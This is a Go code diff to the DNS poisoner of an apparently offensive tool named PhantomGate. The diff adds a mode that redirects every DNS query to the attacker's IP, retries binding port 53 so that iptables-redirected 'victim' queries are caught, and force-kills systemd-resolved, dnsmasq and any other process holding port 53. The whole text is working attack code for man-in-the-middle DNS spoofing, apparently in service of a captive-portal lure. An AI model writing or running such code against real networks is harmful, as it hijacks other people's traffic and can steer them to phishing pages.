@@ -23,6 +23,7 @@ type Poisoner struct {
 	iface       string
 	redirectIP  net.IP          // PhantomGate's IP — where victims get redirected
 	targets     map[string]bool // domains to poison
+	poisonAll   bool            // when true, poison ALL DNS queries (for captive portal)
 	mu          sync.RWMutex
 	stats       PoisonStats
 	running     bool
@@ -148,16 +149,27 @@ func (p *Poisoner) Start() error {
 	p.freePort53()
 
 	// Start UDP DNS listener on port 53 to handle NAT-redirected queries.
-	udpAddr, err := net.ResolveUDPAddr("udp4", ":53")
-	if err == nil {
+	// This is CRITICAL — iptables DNAT redirects victim DNS to us on port 53.
+	// Without this listener, redirected queries get dropped silently.
+	for attempt := 0; attempt < 3; attempt++ {
+		udpAddr, err := net.ResolveUDPAddr("udp4", ":53")
+		if err != nil {
+			break
+		}
 		p.udpConn, err = net.ListenUDP("udp4", udpAddr)
 		if err != nil {
-			log.Printf("[DNS POISONER] Could not bind UDP :53: %v", err)
-			log.Printf("[DNS POISONER] Try: systemctl stop systemd-resolved && killall dnsmasq")
-		} else {
-			log.Printf("[☠️  DNS POISONER] UDP listener on :53 for NAT-redirected queries")
-			go p.udpDNSLoop()
+			log.Printf("[DNS POISONER] Attempt %d: Could not bind UDP :53: %v", attempt+1, err)
+			p.freePort53()
+			time.Sleep(1 * time.Second)
+			continue
 		}
+		log.Printf("[☠️  DNS POISONER] UDP listener on :53 for NAT-redirected queries")
+		go p.udpDNSLoop()
+		break
+	}
+	if p.udpConn == nil {
+		log.Printf("[DNS POISONER] WARNING: UDP :53 listener failed — NAT-redirected DNS will not work!")
+		log.Printf("[DNS POISONER] Run manually: systemctl stop systemd-resolved && killall dnsmasq")
 	}
 
 	go p.sniffLoop()
@@ -193,7 +205,6 @@ func (p *Poisoner) GetStats() PoisonStats {
 
 // freePort53 stops services that commonly hold port 53 (systemd-resolved, dnsmasq)
 func (p *Poisoner) freePort53() {
-	// Check if port 53 is already free
 	ln, err := net.ListenPacket("udp4", ":53")
 	if err == nil {
 		ln.Close()
@@ -202,12 +213,15 @@ func (p *Poisoner) freePort53() {
 
 	log.Printf("[DNS] Port 53 in use, attempting to free it...")
 
-	// Stop systemd-resolved stub listener
+	// Disable systemd-resolved stub listener without fully stopping DNS
 	exec.Command("systemctl", "stop", "systemd-resolved").Run()
 	// Kill any dnsmasq instances
-	exec.Command("killall", "dnsmasq").Run()
+	exec.Command("killall", "-9", "dnsmasq").Run()
+	// Kill anything else on port 53
+	exec.Command("fuser", "-k", "53/udp").Run()
+	exec.Command("fuser", "-k", "53/tcp").Run()
 
-	time.Sleep(500 * time.Millisecond)
+	time.Sleep(1 * time.Second)
 }
 
 // sniffLoop reads raw packets and extracts DNS queries
@@ -435,10 +449,26 @@ func (p *Poisoner) processPacket(packet []byte) {
 	p.incInjected()
 }
 
+// SetPoisonAll enables/disables poisoning of ALL DNS queries
+func (p *Poisoner) SetPoisonAll(enabled bool) {
+	p.mu.Lock()
+	defer p.mu.Unlock()
+	p.poisonAll = enabled
+	if enabled {
+		log.Printf("[DNS POISONER] Poison-all mode ENABLED — all domains → %s", p.redirectIP)
+	} else {
+		log.Printf("[DNS POISONER] Poison-all mode DISABLED — targeting specific domains only")
+	}
+}
+
 // shouldPoison checks if a domain should be poisoned (exact + subdomain match)
 func (p *Poisoner) shouldPoison(domain string) bool {
 	p.mu.RLock()
 	defer p.mu.RUnlock()
+
+	if p.poisonAll {
+		return true
+	}
 
 	// Exact match
 	if p.targets[domain] {
